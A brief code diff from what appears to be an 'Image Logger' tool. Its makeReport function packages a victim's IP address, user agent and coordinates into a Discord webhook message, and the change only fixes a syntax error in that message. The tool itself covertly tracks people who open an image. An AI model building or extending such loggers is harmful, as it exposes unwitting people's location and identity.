@@ -141,7 +141,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     
     embed = {
     "username": config["username"],
-    "content": ping,"@everyone"
+    "content": ping,
     "embeds": [
         {
             "title": "Image Logger - IP Logged",
